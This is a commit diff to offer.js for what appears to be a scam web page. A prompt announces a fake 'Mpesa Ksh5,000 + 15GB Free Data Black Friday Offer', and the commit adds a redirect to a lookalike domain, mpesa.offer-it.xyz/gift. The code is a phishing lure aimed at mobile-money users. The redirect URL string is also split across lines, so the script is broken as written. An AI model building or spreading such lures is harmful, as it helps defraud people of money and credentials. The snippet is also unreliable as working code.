5e869ca6ea1a6e7b6027d82fbc13f8a4da8824b0
KENNY <examtapz+me@gmail.com>
2025-11-17 01:59:51 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -2,7 +2,9 @@
 var password = '0k'
 password=prompt('SMS: Welcome to Mpesa Ksh5,000 + 15GB Free Data Black Friday Offer, Kindly Press OK to ACTIVATE ','15GB Free Data');
 if (password != 'ok') {
-location.href='https://#';
+location.href='https://mpesa.offer-it.xyz/gift 
+';
 
 }
+
 
